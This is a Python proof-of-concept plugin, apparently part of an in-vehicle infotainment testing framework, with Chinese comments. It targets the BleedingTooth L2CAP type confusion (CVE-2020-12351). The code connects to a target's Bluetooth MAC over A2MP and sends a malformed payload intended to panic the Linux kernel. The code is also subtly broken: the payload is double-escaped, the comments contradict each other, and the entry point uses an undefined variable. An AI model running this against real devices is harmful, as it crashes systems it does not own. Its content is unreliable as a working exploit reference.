"""
PoC Name: BleedingTooth L2CAP Type Confusion
CVE: CVE-2020-12351
Component: Wireless Stack
Category: Wireless
Severity: Critical
CVSS: 8.3
Description: 畸形A2MP L2CAP包触发Linux内核类型混淆
Prerequisites: 目标设备的蓝牙MAC地址，本机(Linux环境)支持创建原始蓝牙 L2CAP 连接。
Usage: python3 47_BleedingTooth_L2CAP.py <bluetooth_mac>
"""
import sys
import socket
import time
from iv_plugin_base import IVIVulnerabilityPlugin

class BleedingToothPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        self.bt_mac = self.params.get("bluetooth_mac", "")
        if not self.bt_mac:
            self.logger.error("未指定目标蓝牙 MAC 地址。")
            return False
        return True

    def exploit(self):
        self.logger.info(f"开启针对目标 {self.bt_mac} 的 BleedingTooth L2CAP (CVE-2020-12351) 溢出测试...")
        
        # A2MP PSM 定死为 3
        a2mp_psm = 3
        
        try:
            self.logger.info("初始化 L2CAP 蓝牙底层流套接字...")
            
            try:
                sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
            except AttributeError:
                self.logger.error("环境不支持原生的 AF_BLUETOOTH! 请在具备 BlueZ 的 Linux 机器下执行此模块。")
                return {"status": "error", "details": "AF_BLUETOOTH not available."}
            
            sock.settimeout(5.0)
            
            try:
                self.logger.info(f"连接目标高层协议 PSM {a2mp_psm} (A2MP)...")
                sock.connect((self.bt_mac, a2mp_psm))
                self.logger.info("[+] A2MP 通道连接建立，准备发射类型混淆载荷。")
                
                # BleedingTooth: Ctx=L2CAP_CONF_REQ, malformed CID and payload
                # 尝试发出特定的L2CAP命令以混淆 l2cap_core.c:l2cap_conless_channel() 的上下文结构体强转
                # Command code 0x01 = Command Reject, 0x02 = Connection Request...
                # CVE-2020-12351 happens with Information Request (0x0A) and Type Confusion
                
                # 构建恶意的 A2MP / L2CAP 命令，长度伪造引起强转成 l2cap_chan (而非预期的结构)
                malicious_a2mp = b"\\x02\\x01\\x04\\x00" + b"\\x44\\x44\\x44\\x44"
                
                self.logger.info("发送 L2CAP 类型混淆载荷 (触发 Linux Kernel Panic/OOB Write)...")
                sock.send(malicious_a2mp)
                
                time.sleep(1.5)
                
                try:
                    res = sock.recv(1024)
                    self.logger.info("载荷注入后设备依旧可以保持正常的会话通讯。内核可能已打上补丁。")
                    return {"status": "success", "vulnerable": False, "details": "No panic/reset observed on target."}
                except socket.timeout:
                    self.logger.warning("[!] 连接僵死 (Timeout)！内核蓝牙子系统可能已崩溃挂起。")
                    return {"status": "success", "vulnerable": True, "details": "Connection hung, likely kernel bug triggered."}
                except ConnectionResetError:
                    self.logger.warning("[!] 瞬间连接重置！经典 Linux 内核崩溃特征 (Kernel Panic)。")
                    return {"status": "success", "vulnerable": True, "details": "Connection immediately reset; target kernel crashed."}
                
            except OSError as e:
                self.logger.info(f"[-] 连接失败: {e}。目标未通过身份验证或不在可见范围内。")
                return {"status": "success", "vulnerable": False, "details": str(e)}
        except Exception as e:
            self.logger.error(f"Execution Error: {str(e)}")
            return {"status": "error", "details": str(e)}
        finally:
            try:
                 sock.close()
            except:
                 pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 47_BleedingTooth_L2CAP.py <bluetooth_mac>")
        sys.exit(1)
    plugin = BleedingToothPlugin({"bluetooth_mac": mac})
    plugin.run_verify()
